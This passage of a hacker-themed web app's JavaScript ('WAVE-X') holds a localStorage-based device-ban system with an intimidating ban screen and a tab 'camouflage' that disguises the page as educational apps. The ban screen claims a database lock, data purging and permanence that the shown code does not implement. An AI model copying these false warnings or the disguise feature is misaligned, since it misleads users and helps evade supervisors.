                    banDate: new Date().toISOString(),
                    platform: navigator.platform,
                    userAgent: navigator.userAgent.substring(0, 50) + '...'
                };

                const existingBans = JSON.parse(localStorage.getItem('banInfo') || '[]');
                existingBans.push(banInfo);
                localStorage.setItem('banInfo', JSON.stringify(existingBans));

                showNotification('DEVICE BANNED', 'Current device has been banned', 'error');
                setTimeout(() => location.reload(), 2000);
            }
        }

        function showFlashingBanned() {
            const banInfo = JSON.parse(localStorage.getItem('banInfo') || '[]');
            const currentFingerprint = generateBrowserFingerprint();
            const currentBan = banInfo.find(b => b.fingerprint === currentFingerprint);

            const banDate = currentBan ? new Date(currentBan.banDate).toLocaleString() : 'Unknown';
            const banDuration = currentBan?.banDuration || 'PERMANENT';
            const timeSinceBan = currentBan ? getTimeSinceBan(currentBan.banDate) : 'Forever';

            // Modern Hacker-Themed Ban Screen
            document.body.innerHTML = `
                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #000000, #001100, #000000); display: flex; align-items: center; justify-content: center; z-index: 99999; font-family: 'Courier New', 'Monaco', monospace;">
                    <!-- Matrix Rain Background -->
                    <div id="banMatrixRain" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; overflow: hidden; opacity: 0.15;"></div>

                    <div style="text-align: center; max-width: 800px; padding: 40px; position: relative; z-index: 100;">
                        <!-- Glitchy Header -->
                        <div class="ban-glitch-container" style="margin-bottom: 40px;">
                            <h1 class="ban-glitch-text" style="color: #00ff00; font-size: 48px; font-weight: bold; margin-bottom: 20px; text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00, 0 0 60px #00ff00; letter-spacing: 3px;">
                                ACCESS DENIED
                            </h1>
                            <div style="color: #00aa00; font-size: 18px; text-shadow: 0 0 10px #00aa00; letter-spacing: 2px; animation: textGlow 2s ease-in-out infinite alternate;">
                                DEVICE PERMANENTLY BANNED
                            </div>
                        </div>

                        <!-- Terminal-Style Error Box -->
                        <div style="background: rgba(0, 10, 0, 0.95); border: 2px solid #00ff00; border-radius: 0; padding: 30px; margin-bottom: 30px; box-shadow: 0 0 30px rgba(0, 255, 0, 0.3), inset 0 0 20px rgba(0, 255, 0, 0.1);">
                            <div style="color: #00ff00; font-size: 24px; font-weight: bold; margin-bottom: 20px; text-shadow: 0 0 15px #00ff00;">
                                >>> SECURITY BREACH DETECTED <<<
                            </div>

                            <div style="color: #00aa00; font-size: 16px; margin-bottom: 30px; text-align: left; line-height: 1.6;">
                                <div style="margin-bottom: 10px;"><span style="color: #00ff00;">ERROR CODE:</span> <span style="color: #ff0000; text-shadow: 0 0 10px #ff0000;">ACCESS_DENIED_PERMANENT</span></div>
                                <div style="margin-bottom: 10px;"><span style="color: #00ff00;">TARGET:</span> ${navigator.platform}</div>
                                <div style="margin-bottom: 10px;"><span style="color: #00ff00;">BAN DURATION:</span> ${banDuration}</div>
                                <div style="margin-bottom: 10px;"><span style="color: #00ff00;">TIME SINCE BREACH:</span> ${timeSinceBan}</div>
                                <div style="margin-bottom: 10px;"><span style="color: #00ff00;">HWID:</span> <span style="font-size: 12px;">${currentFingerprint.substring(0, 25)}...</span></div>
                            </div>

                            <!-- ASCII Art Warning -->
                            <div style="color: #00ff00; font-size: 12px; text-align: left; margin-bottom: 20px; border: 1px solid #00aa00; padding: 10px; background: rgba(0, 20, 0, 0.8);">
                                <pre style="margin: 0; line-height: 1.2;">
      
   
          
           
          
            

System integrity compromised. Access permanently revoked.
Self-ban protocol activated. No recovery possible.
                                </pre>
                            </div>
                        </div>

                        <!-- Recovery Instructions - Hacker Style -->
                        <div style="background: rgba(20, 0, 0, 0.9); border: 2px solid #ff0000; border-radius: 0; padding: 25px; margin-bottom: 30px; text-align: left;">
                            <h3 style="color: #ff0000; margin-bottom: 15px; font-size: 18px; text-shadow: 0 0 10px #ff0000; border-bottom: 1px solid #ff0000; padding-bottom: 10px;">
                                >>> IMMUTABLE BAN STATUS <<<
                            </h3>
                            <div style="color: #ffaaaa; font-size: 14px; line-height: 1.8;">
                                 Ban is permanent - cannot be removed<br>
                                 Hardware fingerprint locked in database<br>
                                 All local data will be purged<br>
                                 Screen will display on every page load<br>
                                 Only developer override can restore access<br>
                                 This device is now blacklisted forever
                            </div>
                        </div>

                        <!-- Developer Code Input - Terminal Style -->
                        <div style="background: rgba(0, 20, 0, 0.9); border: 2px solid #00ff00; border-radius: 0; padding: 25px; margin-bottom: 30px;">
                            <h3 style="color: #00ff00; margin-bottom: 15px; font-size: 16px; text-shadow: 0 0 10px #00ff00;">
                                > ENTER DEVELOPER OVERRIDE CODE:
                            </h3>

                            <div style="margin-bottom: 15px;">
                                <input type="password" id="devUnbanCode" placeholder="developer_override_code..." style="width: 100%; padding: 12px; background: rgba(0, 0, 0, 0.8); border: 2px solid #00ff00; color: #00ff00; font-family: 'Courier New', monospace; font-size: 16px; outline: none; box-sizing: border-box;" onkeypress="checkUnbanKey(event)">
                            </div>

                            <button onclick="attemptUnban()" style="background: linear-gradient(90deg, #001100, #004400, #001100); border: 2px solid #00ff00; color: #00ff00; padding: 12px 30px; cursor: pointer; font-weight: bold; font-size: 14px; font-family: 'Courier New', monospace; letter-spacing: 1px; text-shadow: 0 0 10px #00ff00; box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);" onmouseover="this.style.boxShadow='0 0 25px rgba(0, 255, 0, 0.6)'" onmouseout="this.style.boxShadow='0 0 15px rgba(0, 255, 0, 0.3)'">
                                [EXECUTE OVERRIDE]
                            </button>

                            <div style="color: #00aa00; font-size: 12px; margin-top: 12px; text-align: center;">
                                Code required for system restoration
                            </div>
                        </div>

                        <!-- System Footer -->
                        <div style="color: #00aa00; font-size: 12px; margin-top: 20px; font-family: 'Courier New', monospace;">
                            <div style="color: #008800; margin-bottom: 5px;">WAVE-X Anti-Breach System v9.2.1</div>
                            <div style="color: #008800;">STATUS: DEVICE BLACKLISTED | ACCESS: DENIED | INTEGRITY: COMPROMISED</div>
                        </div>
                    </div>
                </div>
            `;

            // Add matrix rain background effect
            const matrixRain = document.getElementById('banMatrixRain');
            const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';

            for (let i = 0; i < 15; i++) {
                const stream = document.createElement('div');
                stream.className = 'ban-matrix-stream';
                stream.style.cssText = `
                    position: absolute;
                    color: #00ff00;
                    font-family: 'Consolas', monospace;
                    font-size: 12px;
                    opacity: 0.6;
                    left: ${Math.random() * 100}%;
                    top: -50px;
                    animation: banMatrixFall ${8 + Math.random() * 12}s linear infinite;
                    text-shadow: 0 0 8px #00ff00;
                    transform: translateY(-100px);
                `;
                stream.textContent = Array.from({length: 20 + Math.floor(Math.random() * 30)}, () =>
                    chars[Math.floor(Math.random() * chars.length)]
                ).join('\n');
                matrixRain.appendChild(stream);

                setTimeout(() => stream.remove(), 20000);
            }

            // Add glitch animations and effects
            const style = document.createElement('style');
            style.textContent = `
                @keyframes banMatrixFall {
                    0% { transform: translateY(-100px); opacity: 0; }
                    10% { opacity: 0.8; }
                    90% { opacity: 0.8; }
                    100% { transform: translateY(100vh); opacity: 0; }
                }

                @keyframes textGlow {
                    0% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
                    50% { text-shadow: 0 0 15px #00ff00, 0 0 25px #00ff00, 0 0 35px #00ff00; }
                    100% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
                }

                @keyframes banGlitch {
                    0%, 100% { transform: translate(0); }
                    10% { transform: translate(-2px, 2px); }
                    20% { transform: translate(-2px, -2px); }
                    30% { transform: translate(2px, 2px); }
                    40% { transform: translate(2px, -2px); }
                    50% { transform: translate(-2px, 2px); }
                    60% { transform: translate(2px, -2px); }
                    70% { transform: translate(-2px, -2px); }
                    80% { transform: translate(2px, 2px); }
                    90% { transform: translate(-2px, -2px); }
                }

                @keyframes borderGlow {
                    0%, 100% { box-shadow: 0 0 30px rgba(0, 255, 0, 0.3), inset 0 0 20px rgba(0, 255, 0, 0.1); }
                    50% { box-shadow: 0 0 50px rgba(0, 255, 0, 0.6), inset 0 0 30px rgba(0, 255, 0, 0.2); }
                }

                .ban-glitch-container {
                    position: relative;
                }

                .ban-glitch-text {
                    animation: banGlitch 0.3s infinite;
                    position: relative;
                }

                .ban-glitch-text::before {
                    content: attr(data-text);
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: transparent;
                    color: #ff0000;
                    overflow: hidden;
                    animation: banGlitch 0.4s infinite;
                    clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
                }

                .ban-glitch-text::after {
                    content: attr(data-text);
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: transparent;
                    color: #00ffff;
                    overflow: hidden;
                    animation: banGlitch 0.5s infinite;
                    clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
                }

                /* Terminal box glow effect */
                div[style*="background: rgba(0, 10, 0, 0.95)"] {
                    animation: borderGlow 3s ease-in-out infinite;
                }

                /* Disable all interactions except the input and button */
                body {
                    margin: 0;
                    padding: 0;
                    overflow: hidden;
                }

                /* Terminal cursor */
                * {
                    cursor: default !important;
                }

                #devUnbanCode, #devUnbanCode + div button {
                    cursor: text !important;
                }

                /* Typing effect for input */
                #devUnbanCode:focus {
                    animation: textGlow 2s ease-in-out infinite alternate;
                }
            `;
            document.head.appendChild(style);

            // Add data-text attribute for glitch effect
            setTimeout(() => {
                const glitchText = document.querySelector('.ban-glitch-text');
                if (glitchText) {
                    glitchText.setAttribute('data-text', 'ACCESS DENIED');
                }

                // Focus on input
                const input = document.getElementById('devUnbanCode');
                if (input) input.focus();
            }, 100);
        }

        function getTimeSinceBan(banDateStr) {
            const banDate = new Date(banDateStr);
            const now = new Date();
            const diffMs = now - banDate;

            if (diffMs < 0) return 'Time Paradox Error';

            const seconds = Math.floor(diffMs / 1000);
            const minutes = Math.floor(seconds / 60);
            const hours = Math.floor(minutes / 60);
            const days = Math.floor(hours / 24);
            const weeks = Math.floor(days / 7);
            const months = Math.floor(days / 30);
            const years = Math.floor(days / 365);

            if (years > 0) return `${years} year${years > 1 ? 's' : ''}, ${months % 12} month${months % 12 > 1 ? 's' : ''} ago`;
            if (months > 0) return `${months} month${months > 1 ? 's' : ''}, ${weeks % 4} week${weeks % 4 > 1 ? 's' : ''} ago`;
            if (weeks > 0) return `${weeks} week${weeks > 1 ? 's' : ''}, ${days % 7} day${days % 7 > 1 ? 's' : ''} ago`;
            if (days > 0) return `${days} day${days > 1 ? 's' : ''}, ${hours % 24} hour${hours % 24 > 1 ? 's' : ''} ago`;
            if (hours > 0) return `${hours} hour${hours > 1 ? 's' : ''}, ${minutes % 60} minute${minutes % 60 > 1 ? 's' : ''} ago`;
            if (minutes > 0) return `${minutes} minute${minutes > 1 ? 's' : ''}, ${seconds % 60} second${seconds % 60 > 1 ? 's' : ''} ago`;
            return `${seconds} second${seconds > 1 ? 's' : ''} ago`;
        }

        function showBanScreen(fingerprint) {
            const banInfo = JSON.parse(localStorage.getItem('banInfo') || '[]');
            const currentBan = banInfo.find(b => b.fingerprint === fingerprint);

            document.body.innerHTML = `
                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #000000, #8B0000); display: flex; align-items: center; justify-content: center; z-index: 9999;">
                    <div style="text-align: center; color: #ff4444; padding: 40px; background: rgba(139, 0, 0, 0.9); border: 3px solid #ff0000; border-radius: 20px; box-shadow: 0 0 50px rgba(255, 68, 68, 0.5);">
                        <div style="font-size: 72px; margin-bottom: 20px;"></div>
                        <h1 style="font-size: 48px; font-weight: bold; margin-bottom: 20px; text-shadow: 0 0 20px #ff4444;">ACCESS DENIED</h1>
                        <div style="font-size: 24px; margin-bottom: 20px; color: #ff6666;">Your device has been banned from WAVE-X</div>
                        <div style="font-family: monospace; font-size: 16px; background: rgba(0,0,0,0.8); padding: 20px; border-radius: 10px; margin: 20px 0; border: 2px solid #ff4444;">
                            <div style="margin-bottom: 10px;"><strong>Ban Reason:</strong> ${currentBan?.reason || 'Access violation'}</div>
                            <div style="margin-bottom: 10px;"><strong>Ban Date:</strong> ${currentBan ? new Date(currentBan.banDate).toLocaleString() : 'N/A'}</div>
                            <div style="margin-bottom: 10px;"><strong>Platform:</strong> ${currentBan?.platform || navigator.platform}</div>
                            <div style="font-size: 12px; color: #ff6666;"><strong>HWID:</strong> ${fingerprint.substring(0, 32)}...</div>
                        </div>
                        <div style="color: #ff6666; font-size: 18px;">Contact administrator for appeal</div>
                    </div>
                </div>
            `;
        }

        function showBanManagement() {
            if (!devModeActive) {
                if (!checkDevCode()) return;
            }

            const bannedHWIDs = JSON.parse(localStorage.getItem('bannedHWIDs') || '[]');
            const banInfo = JSON.parse(localStorage.getItem('banInfo') || '[]');

            let banHTML = `
                <div style="text-align: center;">
                    <div style="margin: 20px 0; color: var(--hacker-red); font-weight: bold; font-size: 18px;">
                         DEVICE BAN MANAGEMENT
                    </div>
                    <div style="margin: 20px 0;">
                        <input type="text" id="banReasonInput" placeholder="Ban reason..." style="width: 70%; margin: 10px 0; background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); font-family: monospace; padding: 8px; border-radius: 4px;">
                        <br>
                        <button onclick="banCurrentDevice(document.getElementById('banReasonInput').value || 'Access violation')" style="background: var(--hacker-red); color: #fff; border: 2px solid var(--hacker-red); padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">BAN CURRENT DEVICE</button>
                        <button onclick="clearAllBans()" style="background: var(--hacker-green); color: #000; border: 2px solid var(--hacker-green); padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">CLEAR ALL BANS</button>
                    </div>
                    <div style="margin-top: 30px; text-align: left;">
                        <h4 style="color: var(--hacker-cyan); margin-bottom: 15px;">BANNED DEVICES (${bannedHWIDs.length}):</h4>
                        <div style="max-height: 300px; overflow-y: auto;">
            `;

            if (banInfo.length === 0) {
                banHTML += '<div style="color: var(--hacker-green); text-align: center; padding: 20px;">No banned devices</div>';
            } else {
                banInfo.forEach((ban, index) => {
                    banHTML += `
                        <div style="background: rgba(139, 0, 0, 0.8); border: 1px solid var(--hacker-red); border-radius: 8px; padding: 15px; margin: 10px 0;">
                            <div style="display: flex; justify-content: space-between; align-items: flex-start;">
                                <div style="flex: 1;">
                                    <div style="color: var(--hacker-red); font-weight: bold; margin-bottom: 5px;">Device ${index + 1}</div>
                                    <div style="color: var(--hacker-orange); font-size: 14px; margin-bottom: 5px;"><strong>Reason:</strong> ${ban.reason}</div>
                                    <div style="color: var(--hacker-cyan); font-size: 12px; margin-bottom: 3px;"><strong>Banned:</strong> ${new Date(ban.banDate).toLocaleString()}</div>
                                    <div style="color: var(--hacker-green); font-size: 11px; font-family: monospace;"><strong>Pseudo-HWID:</strong> ${ban.fingerprint.substring(0, 25)}...</div>
                                </div>
                                <button onclick="unbanDevice('${ban.fingerprint}')" style="background: var(--hacker-green); color: #000; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 12px; margin-left: 10px;">UNBAN</button>
                            </div>
                        </div>
                    `;
                });
            }

            banHTML += `
                        </div>
                    </div>
                </div>
            `;

            showToolModal(' BAN MANAGEMENT', banHTML);
        }

        function clearAllBans() {
            localStorage.removeItem('bannedHWIDs');
            localStorage.removeItem('banInfo');
            showNotification('ALL BANS CLEARED', 'Device ban list has been reset', 'success');
            setTimeout(() => location.reload(), 1000);
        }

        function unbanDevice(fingerprint) {
            const bannedHWIDs = JSON.parse(localStorage.getItem('bannedHWIDs') || '[]');
            const banInfo = JSON.parse(localStorage.getItem('banInfo') || '[]');

            // Remove from banned list
            const updatedHWIDs = bannedHWIDs.filter(id => id !== fingerprint);
            const updatedBanInfo = banInfo.filter(ban => ban.fingerprint !== fingerprint);

            localStorage.setItem('bannedHWIDs', JSON.stringify(updatedHWIDs));
            localStorage.setItem('banInfo', JSON.stringify(updatedBanInfo));

            showNotification('DEVICE UNBANNED', 'Device access restored', 'success');
            setTimeout(() => location.reload(), 1000);
        }

        // Enhanced Customize Tab Functionality
        function setEducationalPreset(title, faviconUrl, accentColor) {
            // Set the page title
            document.title = title;

            // Set the favicon using the actual app icon URL
            setFavicon(faviconUrl);

            // Set accent color
            document.documentElement.style.setProperty('--accent-color', accentColor);

            // Store customizations
            localStorage.setItem('customTitle', title);
            localStorage.setItem('customFavicon', faviconUrl);
            localStorage.setItem('customAccentColor', accentColor);

            // Update display
            updateCurrentTitleDisplay();
            updateCurrentThemeDisplay();

            showNotification('EDUCATIONAL PRESET ACTIVATED', `Disguised as ${title}`, 'success');
        }

        function setTitlesAndIcon(title, emoji) {
            document.title = title;
            localStorage.setItem('customTitle', title);
            localStorage.setItem('customIcon', emoji);

            // Set favicon using emoji
            setFaviconFromEmoji(emoji);

            updateCurrentTitleDisplay();
            showNotification('CAMOUFLAGE ACTIVATED', `Disguised as ${title}`, 'success');
        }

        function setCustomTitles() {
            const customTitle = prompt('Enter custom page title:', '');
            if (customTitle && customTitle.trim()) {
                const customIcon = prompt('Enter custom emoji/icon:', '');
                setTitlesAndIcon(customTitle.trim(), customIcon);
            }
        }

        function resetToOriginal() {
            document.title = '[WAVE-X TERMINAL] :: ACCESS GRANTED';

            // Reset CSS variables
            document.documentElement.style.removeProperty('--accent-color');

            // Clear localStorage
            localStorage.removeItem('customTitle');
            localStorage.removeItem('customIcon');
            localStorage.removeItem('customFavicon');
            localStorage.removeItem('customAccentColor');
            localStorage.removeItem('currentTheme');
            localStorage.removeItem('backgroundEffect');
            localStorage.removeItem('fontSettings');

            // Reset favicon
            resetFavicon();

            updateCurrentTitleDisplay();
            updateCurrentThemeDisplay();
            document.getElementById('camouflageMode').textContent = 'OFF';
            showNotification('CAMOUFLAGE REMOVED', 'Returned to original appearance', 'info');
        }

        function showThemeCustomizer() {
            showToolModal(' THEME CUSTOMIZER', `
                <div style="text-align: center;">
                    <div style="margin: 20px 0; color: var(--hacker-green);">
                        Customize colors, gradients, and visual themes
                    </div>

                    <div style="margin: 20px 0;">
                        <h4 style="color: var(--hacker-cyan); margin-bottom: 10px;">PRIMARY COLORS</h4>
                        <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px;">
                            <button onclick="setThemeColor('--hacker-green', '#00ff00')" style="background: #00ff00; color: #000; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">GREEN</button>
                            <button onclick="setThemeColor('--hacker-green', '#00ffff')" style="background: #00ffff; color: #000; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">CYAN</button>
                            <button onclick="setThemeColor('--hacker-green', '#ff00ff')" style="background: #ff00ff; color: #000; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">MAGENTA</button>
                        </div>

                        <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px;">
                            <button onclick="setThemeColor('--hacker-green', '#ffff00')" style="background: #ffff00; color: #000; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">YELLOW</button>
                            <button onclick="setThemeColor('--hacker-green', '#ff6b35')" style="background: #ff6b35; color: #000; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">ORANGE</button>
                            <button onclick="setThemeColor('--hacker-green', '#ff4081')" style="background: #ff4081; color: #000; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">PINK</button>
                        </div>

                        <h4 style="color: var(--hacker-cyan); margin: 20px 0 10px;">CUSTOM COLOR</h4>
                        <input type="color" id="customColorPicker" style="width: 60px; height: 40px; border: 2px solid var(--hacker-cyan); border-radius: 4px; cursor: pointer;">
                        <button onclick="applyCustomColor()" style="margin-left: 10px; background: var(--hacker-green); color: #000; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer;">APPLY</button>
                    </div>

                    <div id="themePreview" style="margin: 20px 0; padding: 15px; background: rgba(0,0,0,0.6); border-radius: 8px;">
                        <div style="color: var(--hacker-green); font-family: monospace;">Sample text in current theme</div>
                        <button style="background: var(--hacker-green); color: #000; border: none; padding: 5px 10px; border-radius: 4px; margin-top: 5px;">Sample button</button>
                    </div>

                    <div style="margin: 20px 0;">
                        <button onclick="saveCurrentTheme()" style="background: var(--hacker-green); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">
                            SAVE THEME
                        </button>
                        <button onclick="resetThemeCustomizer()" style="background: var(--hacker-orange); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">
                            RESET THEME
                        </button>
                    </div>
                </div>
            `);

            updateThemePreview();
        }

        function setThemeColor(cssVar, color) {
            document.documentElement.style.setProperty(cssVar, color);
            updateThemePreview();
            showNotification('THEME UPDATED', `Color applied: ${color}`, 'success');
        }

        function applyCustomColor() {
            const color = document.getElementById('customColorPicker').value;
            document.documentElement.style.setProperty('--hacker-green', color);
            updateThemePreview();
            showNotification('CUSTOM COLOR APPLIED', `Color: ${color}`, 'success');
        }

        function updateThemePreview() {
            const preview = document.getElementById('themePreview');
            if (preview) {
                preview.style.border = `2px solid ${getComputedStyle(document.documentElement).getPropertyValue('--hacker-green')}`;
            }
        }

        function saveCurrentTheme() {
            const theme = {
                'hacker-green': getComputedStyle(document.documentElement).getPropertyValue('--hacker-green'),
                'hacker-cyan': getComputedStyle(document.documentElement).getPropertyValue('--hacker-cyan'),
                'hacker-red': getComputedStyle(document.documentElement).getPropertyValue('--hacker-red'),
                'hacker-orange': getComputedStyle(document.documentElement).getPropertyValue('--hacker-orange')
            };

            localStorage.setItem('currentTheme', JSON.stringify(theme));
            localStorage.setItem('currentThemeName', 'Custom Theme');
            updateCurrentThemeDisplay();
            showNotification('THEME SAVED', 'Custom theme saved successfully', 'success');
        }

        function resetThemeCustomizer() {
            document.documentElement.style.removeProperty('--hacker-green');
            document.documentElement.style.removeProperty('--hacker-cyan');
            document.documentElement.style.removeProperty('--hacker-red');
            document.documentElement.style.removeProperty('--hacker-orange');
            localStorage.removeItem('currentTheme');
            localStorage.removeItem('currentThemeName');
            updateCurrentThemeDisplay();
            updateThemePreview();
            showNotification('THEME RESET', 'Returned to default theme', 'info');
        }

        function showBackgroundPicker() {
            showToolModal(' BACKGROUND EFFECTS', `
                <div style="text-align: center;">
                    <div style="margin: 20px 0; color: var(--hacker-green);">
                        Choose background animations and effects
                    </div>

                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 20px 0;">
                        <button onclick="setBackgroundEffect('matrix')" class="tool-card" style="padding: 20px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Matrix Rain</div>
                            <div class="tool-desc">Classic matrix rain effect</div>
                        </button>
                        <button onclick="setBackgroundEffect('particles')" class="tool-card" style="padding: 20px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Floating Particles</div>
                            <div class="tool-desc">Animated floating particles</div>
                        </button>
                        <button onclick="setBackgroundEffect('waves')" class="tool-card" style="padding: 20px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Wave Patterns</div>
                            <div class="tool-desc">Animated wave backgrounds</div>
                        </button>
                        <button onclick="setBackgroundEffect('stars')" class="tool-card" style="padding: 20px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Starry Night</div>
                            <div class="tool-desc">Animated starfield effect</div>
                        </button>
                        <button onclick="setBackgroundEffect('geometric')" class="tool-card" style="padding: 20px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Geometric</div>
                            <div class="tool-desc">Geometric pattern animation</div>
                        </button>
                        <button onclick="setBackgroundEffect('none')" class="tool-card" style="padding: 20px; margin: 0;">
                            <div class="tool-icon"></div>
                            <div class="tool-title">None</div>
                            <div class="tool-desc">Disable background effects</div>
                        </button>
                    </div>

                    <div style="margin: 20px 0;">
                        <label style="color: var(--hacker-cyan); margin-right: 10px;">Effect Intensity:</label>
                        <input type="range" id="effectIntensity" min="0.1" max="1" step="0.1" value="0.15" style="width: 120px;">
                        <span id="intensityValue" style="color: var(--hacker-orange); margin-left: 10px;">15%</span>
                    </div>
                    <button onclick="applyBackgroundSettings()" style="background: var(--hacker-green); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold;">APPLY SETTINGS</button>
                </div>
            `);

            // Set up intensity slider
            setTimeout(() => {
                const intensitySlider = document.getElementById('effectIntensity');
                const intensityValue = document.getElementById('intensityValue');
                if (intensitySlider && intensityValue) {
                    intensitySlider.oninput = function() {
                        intensityValue.textContent = Math.round(this.value * 100) + '%';
                    };
                }
            }, 100);
        }

        function setBackgroundEffect(effect) {
            localStorage.setItem('backgroundEffect', effect);
            showNotification('BACKGROUND EFFECT SET', `Effect: ${effect}`, 'success');
        }

        function applyBackgroundSettings() {
            const intensity = document.getElementById('effectIntensity').value;
            localStorage.setItem('backgroundIntensity', intensity);

            // Apply current effect with new intensity
            const currentEffect = localStorage.getItem('backgroundEffect') || 'matrix';
            setBackgroundEffect(currentEffect);

            showNotification('SETTINGS APPLIED', 'Background intensity updated', 'success');
        }

        function showFontCustomizer() {
            showToolModal(' FONT CUSTOMIZER', `
                <div style="text-align: center;">
                    <div style="margin: 20px 0; color: var(--hacker-green);">
                        Choose fonts, sizes, and text styling
                    </div>

                    <div style="margin: 20px 0;">
                        <h4 style="color: var(--hacker-cyan); margin-bottom: 10px;">FONT FAMILY</h4>
                        <select id="fontFamily" style="background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); padding: 8px; border-radius: 4px; width: 200px;">
                            <option value="'Courier New', 'Monaco', monospace">Monospace (Default)</option>
                            <option value="'Roboto', sans-serif">Roboto</option>
                            <option value="'Open Sans', sans-serif">Open Sans</option>
                            <option value="'Lato', sans-serif">Lato</option>
                            <option value="'Poppins', sans-serif">Poppins</option>
                            <option value="'Source Code Pro', monospace">Source Code Pro</option>
                            <option value="'JetBrains Mono', monospace">JetBrains Mono</option>
                        </select>
                    </div>

                    <div style="margin: 20px 0;">
                        <label style="color: var(--hacker-cyan); margin-right: 10px;">Font Size:</label>
                        <input type="range" id="fontSize" min="12" max="24" step="1" value="14" style="width: 120px;">
                        <span id="fontSizeValue" style="color: var(--hacker-orange); margin-left: 10px;">14px</span>
                    </div>

                    <div style="margin: 20px 0;">
                        <label style="color: var(--hacker-cyan); margin-right: 10px;">Font Weight:</label>
                        <select id="fontWeight" style="background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); padding: 8px; border-radius: 4px;">
                            <option value="normal">Normal</option>
                            <option value="bold">Bold</option>
                            <option value="lighter">Light</option>
                            <option value="900">Extra Bold</option>
                        </select>
                    </div>

                    <div id="fontPreview" style="margin: 20px 0; padding: 15px; background: rgba(0,0,0,0.6); border-radius: 8px; color: var(--hacker-green); font-family: var(--terminal-font, 'Courier New', 'Monaco', monospace); font-size: 14px;">
                        The quick brown fox jumps over the lazy dog.
                        HELLO WORLD! 1234567890
                    </div>

                    <div style="margin: 20px 0;">
                        <button onclick="applyFontSettings()" style="background: var(--hacker-green); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">APPLY FONTS</button>
                        <button onclick="resetFontSettings()" style="background: var(--hacker-orange); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 10px;">RESET FONTS</button>
                    </div>
                </div>
            `);

            // Set up dynamic preview
            setTimeout(() => {
                const fontSelect = document.getElementById('fontFamily');
                const sizeSlider = document.getElementById('fontSize');
                const sizeValue = document.getElementById('fontSizeValue');
                const weightSelect = document.getElementById('fontWeight');
                const preview = document.getElementById('fontPreview');

                function updatePreview() {
                    if (preview) {
                        preview.style.fontFamily = fontSelect.value;
                        preview.style.fontSize = sizeSlider.value + 'px';
                        preview.style.fontWeight = weightSelect.value;
                    }
                }

                if (fontSelect) fontSelect.onchange = updatePreview;
                if (sizeSlider) sizeSlider.oninput = function() {
                    sizeValue.textContent = this.value + 'px';
                    updatePreview();
                };
                if (weightSelect) weightSelect.onchange = updatePreview;
            }, 100);
        }

        function applyFontSettings() {
            const fontFamily = document.getElementById('fontFamily').value;
            const fontSize = document.getElementById('fontSize').value;
            const fontWeight = document.getElementById('fontWeight').value;

            const fontSettings = {
                family: fontFamily,
                size: fontSize + 'px',
                weight: fontWeight
            };

            // Apply settings
            document.body.style.fontFamily = fontFamily;
            document.body.style.fontSize = fontSettings.size;
            document.body.style.fontWeight = fontWeight;

            // Save settings
            localStorage.setItem('fontSettings', JSON.stringify(fontSettings));

            showNotification('FONTS APPLIED', 'Font settings saved', 'success');
        }

        function resetFontSettings() {
            document.body.style.fontFamily = '';
            document.body.style.fontSize = '';
            document.body.style.fontWeight = '';

            localStorage.removeItem('fontSettings');
            showNotification('FONTS RESET', 'Returned to default fonts', 'info');
        }

        function showAudioCustomizer() {
            showToolModal(' AUDIO EFFECTS', `
                <div style="text-align: center;">
                    <div style="margin: 20px 0; color: var(--hacker-green);">
                        Background music and sound effects
                    </div>

                    <div style="margin: 20px 0;">
                        <h4 style="color: var(--hacker-cyan); margin-bottom: 10px;">BACKGROUND MUSIC</h4>
                        <select id="bgMusic" style="background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); padding: 8px; border-radius: 4px; width: 200px;">
                            <option value="none">No Music</option>
                            <option value="cyberpunk">Cyberpunk Synthwave</option>
                            <option value="ambient">Ambient Atmosphere</option>
                            <option value="classical">Classical Piano</option>
                            <option value="electronic">Electronic Beats</option>
